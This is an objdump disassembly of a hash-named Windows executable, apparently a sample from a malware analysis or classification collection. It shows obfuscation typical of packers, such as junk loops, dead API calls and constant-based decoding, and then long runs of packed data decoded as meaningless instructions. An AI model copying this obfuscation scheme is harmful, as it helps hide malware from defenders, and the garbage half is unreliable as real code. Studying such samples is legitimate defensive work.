
8af6692ad02d22046970df3140b87718c080d86d4ca06d9c7670e962658062df.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9bb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9bf
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9c3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9cb
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9cf
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42a9d3
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42a9d7
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0x66a705df],esi
  4014ce:	setb   BYTE PTR gs:[ebx+0x47838383]
  4014d6:	pusha  
  4014d7:	add    DWORD PTR [ebx+0x3e28312a],0x26
  4014de:	cmp    ah,BYTE PTR [eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	call   0xda4b:0x72737273
  4014ec:	loope  0x4014ec
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	sbb    eax,0x74b83128
  401581:	inc    esi
  401582:	into   
  401583:	xchg   BYTE PTR [ecx+edx*1],dh
  401586:	push   es
  401587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401588:	push   0xfffffff8
  40158a:	sub    dh,BYTE PTR [ecx+eax*4-0x18]
  40158e:	mov    ch,0xa1
  401590:	push   ds
  401591:	aad    0xeb
  401593:	and    DWORD PTR [edx-0x213bee4d],ebx
  401599:	push   es
  40159a:	jns    0x401591
  40159c:	mov    ?,esp
  40159e:	jge    0x4015da
  4015a0:	repnz mov ebx,0xdd0b8441
  4015a7:	out    0x5c,al
  4015a9:	mov    al,ds:0x8c290411
  4015ae:	(bad)  
  4015af:	in     al,0x8f
  4015b1:	sbb    al,0x57
  4015b3:	fs pop ecx
  4015b5:	cwde   
  4015b6:	add    ebp,esi
  4015b8:	dec    esp
  4015b9:	sub    al,0xc0
  4015bb:	ret    0x3074
  4015be:	sub    edx,DWORD PTR [edi+0x12dcf9d3]
  4015c4:	sbb    DWORD PTR [ebx],ecx
  4015c6:	fild   DWORD PTR [eax]
  4015c8:	mov    esp,0x7d4dec31
  4015cd:	int    0x6b
  4015cf:	sahf   
  4015d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d1:	cmp    al,0xb
  4015d3:	addr16 (bad) 
  4015d6:	pushf  
  4015d7:	sbb    ecx,DWORD PTR [edi+ebp*2]
  4015da:	xchg   edx,eax
  4015db:	sahf   
  4015dc:	loop   0x40155f
  4015de:	shr    DWORD PTR [eax],1
  4015e0:	sub    eax,0x3ec0abbd
  4015e5:	aas    
  4015e6:	sub    ch,0x29
  4015e9:	out    dx,eax
  4015ea:	inc    esp
  4015eb:	es jp  0x4015e7
  4015ee:	or     DWORD PTR [edx],eax
  4015f0:	nop
  4015f1:	lods   al,BYTE PTR ds:[esi]
  4015f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015f3:	inc    edi
  4015f4:	adc    ecx,ebp
  4015f6:	pop    esi
  4015f7:	xor    eax,0x1a1a06bc
  4015fc:	pop    eax
  4015fd:	and    al,0x9e
  4015ff:	push   0xccbd9015
  401604:	sti    
  401605:	mov    ebp,0xd2aef2a0
  40160a:	dec    edi
  40160b:	pop    ss
  40160c:	je     0x4015ac
  40160e:	dec    esp
  40160f:	pop    ebp
  401610:	and    ebp,DWORD PTR [edx]
  401612:	sbb    al,dh
  401614:	pop    ebp
  401615:	sti    
  401616:	test   BYTE PTR [edx+edi*2+0x78706fbb],ah
  40161d:	cmp    BYTE PTR [ecx-0x5b],0xb7
  401621:	inc    edx
  401622:	cmp    ebp,0x33
  401625:	shl    dl,cl
  401627:	push   edi
  401628:	sbb    ecx,DWORD PTR [eax]
  40162a:	pop    edi
  40162b:	inc    ebp
  40162c:	aam    0x91
  40162e:	mov    cl,0xcb
  401630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401631:	or     eax,0x5826e70c
  401636:	cmp    eax,0x5533b41e
  40163b:	sub    eax,0x79fbf988
  401640:	inc    ebp
  401641:	add    ecx,DWORD PTR [ecx]
  401643:	imul   ecx,DWORD PTR [edi-0x2b1dcf02],0x11ee8b38
  40164d:	cmc    
  40164e:	fsubr  DWORD PTR [esi+0x2c]
  401651:	or     al,al
  401653:	popf   
  401654:	dec    ecx
  401655:	pop    eax
  401656:	add    BYTE PTR [edx+0x34d9d780],0x60
  40165d:	add    eax,DWORD PTR [eax]
  40165f:	dec    esp
  401660:	in     al,dx
  401661:	cwde   
  401662:	jg     0x401607
  401664:	fistp  QWORD PTR [ebp+0x4bad360f]
  40166a:	sub    DWORD PTR [ebp+0x51],esi
  40166d:	pop    es
  40166e:	xor    BYTE PTR [edi-0x382f8cf],cl
  401674:	push   edi
  401675:	lods   al,BYTE PTR ds:[esi]
  401676:	push   eax
  401677:	lods   eax,DWORD PTR ds:[esi]
  401678:	cmp    edi,ebp
  40167a:	sahf   
  40167b:	cli    
  40167c:	pop    edx
  40167d:	pop    esp
  40167e:	mov    al,ds:0x57f56104
  401683:	retf   
  401684:	out    dx,al
  401685:	xor    edx,ebx
  401687:	mov    al,0x68
  401689:	lahf   
  40168a:	enter  0x5376,0x26
  40168e:	sub    BYTE PTR [eax],ch
  401690:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401691:	in     al,0xe5
  401693:	mov    edx,0x20656839
  401698:	aas    
  401699:	xlat   BYTE PTR ds:[ebx]
  40169a:	sub    eax,DWORD PTR [eax+0x5d44d6d5]
  4016a0:	push   ds
  4016a1:	les    esi,FWORD PTR [ebx-0x6a]
  4016a4:	xor    eax,0x9e7f0e26
  4016a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016aa:	cmovae esi,DWORD PTR [edx-0x7b494eb]
  4016b1:	mov    ebx,0x25c78d46
  4016b6:	ins    BYTE PTR es:[edi],dx
  4016b7:	test   eax,0xca85900d
  4016bc:	and    edx,ebx
  4016be:	lods   eax,DWORD PTR ds:[esi]
  4016bf:	xchg   DWORD PTR [edi+0x78],edx
  4016c2:	mov    cl,0x96
  4016c4:	shr    bl,0x75
  4016c7:	in     eax,dx
  4016c8:	mov    dh,0x6a
  4016ca:	sub    eax,DWORD PTR [edi-0x51]
  4016cd:	xchg   edx,eax
  4016ce:	shr    BYTE PTR [eax],0xf8
  4016d1:	pop    edx
  4016d2:	cmc    
  4016d3:	adc    edi,DWORD PTR [edx+0xa]
  4016d6:	and    al,0xb7
  4016d8:	adc    bh,bl
  4016da:	sbb    al,0xee
  4016dc:	xor    BYTE PTR [edx],cl
  4016de:	pop    ss
  4016df:	ins    BYTE PTR es:[edi],dx
  4016e0:	aaa    
  4016e1:	test   al,dl
  4016e3:	imul   esi,edx,0x6c
  4016e6:	imul   BYTE PTR [ebp+0x21]
  4016e9:	fcmovbe st,st(2)
  4016eb:	push   ebp
  4016ec:	or     BYTE PTR [ecx+0x7734a3c],0x15
  4016f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f4:	push   0xffffffa7
  4016f6:	push   ebp
  4016f7:	test   DWORD PTR [esp+ebx*2-0x6d],edx
  4016fb:	lahf   
  4016fc:	pop    eax
  4016fd:	jp     0x40173f
  4016ff:	mul    eax
  401701:	(bad)  
  401702:	sub    edi,DWORD PTR [edi-0x57]
  401705:	shr    BYTE PTR [edi-0x4f],0x84
  401709:	loopne 0x4016ed
  40170b:	sub    BYTE PTR [esp+eax*2],0x1a
  40170f:	pop    esp
  401710:	jns    0x4016ec
  401712:	fimul  WORD PTR [ebx-0x73]
  401715:	or     dh,BYTE PTR [edx]
  401717:	call   0x2014:0xce9eaf66
  40171e:	pop    ebx
  40171f:	scas   eax,DWORD PTR es:[edi]
  401720:	les    edx,FWORD PTR [ebx-0x38b544ad]
  401726:	jmp    0x16b4f906
  40172b:	sbb    BYTE PTR [eax+0x3f09400b],al
  401731:	mov    cl,0x34
  401733:	fnstcw WORD PTR [edx]
  401735:	in     ax,dx
  401737:	ret    0x8496
  40173a:	or     BYTE PTR [ecx+edx*4+0x11],bh
  40173e:	xchg   ecx,eax
  40173f:	jo     0x401719
  401741:	and    eax,0x872b31fc
  401746:	and    al,ah
  401748:	or     ebp,ebx
  40174a:	mov    WORD PTR ds:0x36e6cd65,gs
  401750:	dec    ecx
  401751:	cmp    ch,BYTE PTR [edx+ecx*8]
  401754:	xor    esi,ebp
  401756:	ins    DWORD PTR es:[edi],dx
  401757:	push   ds
  401758:	ficom  DWORD PTR [ecx+0x45]
  40175b:	aam    0x70
  40175d:	sbb    ebp,DWORD PTR [ebx-0x35]
  401760:	mov    bh,0xbf
  401762:	sbb    BYTE PTR [ebx+esi*8+0x5],ah
  401766:	scas   al,BYTE PTR es:[edi]
  401767:	xchg   ecx,eax
  401768:	daa    
  401769:	inc    edi
  40176a:	(bad)  
  40176b:	aaa    
  40176c:	dec    ebx
  40176d:	xlat   BYTE PTR ds:[ebx]
  40176e:	or     ebx,0xbb2729dc
  401774:	dec    edi
  401775:	pop    es
  401776:	xlat   BYTE PTR ds:[ebx]
  401777:	popf   
  401778:	push   edi
  401779:	data16 mov ch,BYTE PTR [eax]
  40177c:	inc    esi
  40177d:	mov    dl,0x14
  40177f:	and    al,0x31
  401781:	mov    edx,0x1a435861
  401786:	mov    BYTE PTR [esi-0x70a2cd71],dh
  40178c:	jge    0x401805
  40178e:	xchg   ebx,eax
  40178f:	inc    edx
  401790:	sbb    eax,DWORD PTR [esi]
  401792:	out    0x86,eax
  401794:	jae    0x401795
  401796:	(bad)  
  401797:	aas    
  401798:	xor    ebp,DWORD PTR [ebx-0x4c]
  40179b:	dec    edx
  40179c:	xor    bl,bh
  40179e:	(bad)  
  40179f:	leave  
  4017a0:	xchg   ebx,eax
  4017a1:	sbb    dl,BYTE PTR [esi+0x31]
  4017a4:	mov    bl,0xf6
  4017a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017a7:	sbb    esp,DWORD PTR [esi]
  4017a9:	and    DWORD PTR [eax+0x150d8796],ebx
  4017af:	push   ecx
  4017b0:	repz aaa 
  4017b2:	fisttp DWORD PTR [eax]
  4017b4:	out    0xf8,al
  4017b6:	imul   esi,ebx,0xc964f963
  4017bc:	in     al,dx
  4017bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017be:	inc    esi
  4017bf:	js     0x401767
  4017c1:	popa   
  4017c2:	std    
  4017c3:	mov    edx,0x3c3e159a
  4017c8:	fist   DWORD PTR ss:0x1ae44ce2
  4017cf:	xor    ebp,DWORD PTR [ebx]
  4017d1:	cmc    
  4017d2:	dec    esp
  4017d3:	xchg   ecx,eax
  4017d4:	and    dl,0xc
  4017d7:	inc    esi
  4017d8:	outs   dx,DWORD PTR ds:[esi]
  4017d9:	sub    eax,0x4d25859c
  4017de:	xor    edi,ebp
  4017e0:	leave  
  4017e1:	push   ebx
  4017e2:	push   ecx
  4017e3:	cmp    BYTE PTR [esi+eax*2+0x19],cl
  4017e7:	jo     0x4017a4
  4017e9:	je     0x401837
  4017eb:	add    DWORD PTR [esi+0x5e88ddc3],esi
  4017f1:	mov    bl,al
  4017f3:	leave  
  4017f4:	(bad)  
  4017f5:	push   esi
  4017f6:	add    cl,BYTE PTR [ecx]
  4017f8:	leave  
  4017f9:	gs xchg esi,eax
  4017fb:	test   al,0x55
  4017fd:	mov    al,ds:0xb52ac054
  401802:	and    al,0x79
  401804:	jbe    0x401883
  401806:	test   DWORD PTR [edx-0x20],edi
  401809:	push   cs
  40180a:	mov    DWORD PTR [edi+ebp*2],esp
  40180d:	cmp    al,0xa2
  40180f:	idiv   DWORD PTR [esi+0xf118426]
  401815:	int3   
  401816:	dec    ebx
  401817:	test   DWORD PTR [edx],edx
  401819:	ror    BYTE PTR [edi+eiz*4+0x63],cl
  40181d:	dec    edi
  40181e:	mov    ch,0x59
  401820:	out    0x66,eax
  401822:	adc    eax,0x8ca4432f
  401827:	dec    esp
  401828:	(bad)
  40182b:	fidiv  WORD PTR [edi+0x76]
  40182e:	inc    esi
  40182f:	pop    eax
  401830:	les    eax,FWORD PTR [esp+ebp*2]
  401833:	fild   WORD PTR [ebx]
  401835:	int3   
  401836:	dec    eax
  401837:	outs   dx,DWORD PTR ds:[esi]
  401838:	loop   0x401828
  40183a:	sbb    BYTE PTR [edi-0x4c],ah
  40183d:	cli    
  40183e:	fsubr  st,st(7)
  401840:	add    al,0x61
  401842:	lods   eax,DWORD PTR ds:[esi]
  401843:	es pop eax
  401845:	dec    esi
  401846:	push   0xc6383100
  40184b:	xor    ebp,DWORD PTR [esp+ebp*8-0x6d2abd66]
  401852:	lock sti 
  401854:	ins    DWORD PTR es:[edi],dx
  401855:	fucomp st(6)
  401857:	shr    ebp,cl
  401859:	mov    cl,0xb7
  40185c:	popf   
  40185d:	outs   dx,BYTE PTR ds:[esi]
  40185e:	iret   
  40185f:	fidiv  DWORD PTR ds:[eax+0x10089cc6]
  401867:	pop    esp
  401868:	shl    BYTE PTR [ebp+0x2],1
  40186b:	scas   al,BYTE PTR es:[edi]
  40186c:	mov    al,dl
  40186e:	jo     0x4018df
  401870:	pop    eax
  401871:	push   ebp
  401872:	in     al,dx
  401873:	push   esp
  401874:	sub    al,0x4d
  401876:	mov    gs,WORD PTR [edx+ebp*2]
  401879:	aad    0x15
  40187b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40187c:	xchg   esi,eax
  40187d:	xchg   esp,eax
  40187e:	mov    ch,0xf9
  401880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401881:	mov    dl,0x84
  401883:	loope  0x40183b
  401885:	cmp    DWORD PTR [esp+ebx*4],esp
  401888:	jns    0x401899
  40188a:	dec    ebp
  40188b:	test   DWORD PTR ds:0x72e1c160,0x9f96eefa
  401895:	mov    al,0x69
  401897:	cs test al,0xc8
  40189a:	jae    0x4018a8
  40189c:	push   esi
  40189d:	shr    BYTE PTR [edi],1
  40189f:	imul   ebx,DWORD PTR [edx+0x6c03ad87],0x50
  4018a6:	frstor [eax-0x7c58c051]
  4018ac:	stc    
  4018ad:	test   bl,dl
  4018af:	cmp    dl,ch
  4018b1:	daa    
  4018b2:	and    dl,BYTE PTR [eax-0x489d6d88]
  4018b8:	stos   BYTE PTR es:[edi],al
  4018b9:	cmp    BYTE PTR [eax+edi*4-0x5],cl
  4018bd:	lods   al,BYTE PTR ds:[esi]
  4018be:	jns    0x40186a
  4018c0:	xchg   ebx,eax
  4018c1:	cmc    
  4018c2:	mov    edx,0x2b573f7d
  4018c7:	out    dx,al
  4018c8:	call   0x703:0xd07a81ca
  4018cf:	inc    esi
  4018d0:	inc    ecx
  4018d1:	ret    
  4018d2:	ret    
  4018d3:	loope  0x401895
  4018d5:	rol    BYTE PTR ds:0x9599d11e,cl
  4018db:	or     bl,dl
  4018dd:	push   0x86f33ac6
  4018e2:	data16 jns 0x40191c
  4018e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018e6:	aam    0x48
  4018e8:	sbb    ecx,esi
  4018ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018eb:	xor    ebp,DWORD PTR [ecx+0x11]
  4018ee:	dec    edi
  4018ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018f0:	aam    0xf8
  4018f2:	adc    BYTE PTR [ecx+0x61],bl
  4018f5:	inc    esp
  4018f6:	mov    ds:0x3e501720,eax
  4018fb:	xchg   ebp,eax
  4018fc:	jmp    0x65d:0x8a2ac0de
  401903:	mov    bh,0x97
  401905:	mov    ebx,0xd98fab46
  40190a:	test   DWORD PTR [ebp-0x25],ebx
  40190d:	repnz shl DWORD PTR [eax],1
  401910:	push   edx
  401911:	push   es
  401912:	fadd   DWORD PTR [eax+0x2690ce17]
  401918:	int    0x59
  40191a:	ds mov eax,0x64411ddf
  401920:	std    
  401921:	and    al,0x34
  401923:	adc    ebx,DWORD PTR [ebp-0xb]
  401926:	addr16 mov ebx,0x79a8c88e
  40192c:	and    eax,0x6b146ceb
  401931:	jbe    0x401928
  401933:	adc    dh,cl
  401935:	cld    
  401936:	mov    eax,0xe836cefc
  40193b:	xor    al,0x3d
  40193d:	or     eax,eax
  40193f:	cmc    
  401940:	ror    DWORD PTR [ecx-0x6b],cl
  401943:	imul   esp,DWORD PTR [ebp+0x14],0x6
  401947:	out    dx,eax
  401948:	scas   al,BYTE PTR es:[edi]
  401949:	push   ebp
  40194a:	loope  0x40196c
  40194c:	xor    eax,0xb8c46925
  401951:	cmp    DWORD PTR [esi],ebx
  401953:	mov    edi,esi
  401955:	stc    
  401956:	xchg   ebp,eax
  401957:	jl     0x401908
  401959:	and    al,0x38
  40195b:	int    0xda
  40195d:	xchg   ebx,eax
  40195e:	mov    ebx,0x79207866
  401963:	aas    
  401964:	mov    BYTE PTR [eax+0x3ba910e2],0xda
  40196b:	je     0x401981
  40196d:	add    al,0xd8
  40196f:	ror    BYTE PTR [edi],1
  401971:	rol    BYTE PTR [ecx-0x40625844],0x18
  401978:	les    eax,FWORD PTR cs:[edx+ebx*4-0x17be25fc]
  401980:	int3   
  401981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401982:	jno    0x4019ef
  401984:	outs   dx,DWORD PTR ds:[esi]
  401985:	jmp    0x401926
  401987:	dec    edx
  401988:	sbb    eax,0x2bf2395a
  40198d:	pop    eax
  40198e:	lds    ebx,FWORD PTR [eax+esi*1-0x2743aa62]
  401995:	shl    BYTE PTR [edx-0x25],0x90
  401999:	ins    DWORD PTR es:[edi],dx
